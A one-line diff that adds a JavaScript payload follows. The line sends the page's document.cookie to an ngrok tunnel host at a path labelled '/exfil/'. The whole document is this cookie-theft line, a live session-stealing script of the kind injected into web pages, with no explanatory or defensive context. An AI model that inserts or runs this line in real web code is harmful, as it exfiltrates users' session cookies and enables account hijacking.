@@ -1,0 +1,1 @@
+fetch('https://5b0a-2a09-bac0-1000-252-00-db-d.ngrok-free.app/exfil/?c='+document.cookie)
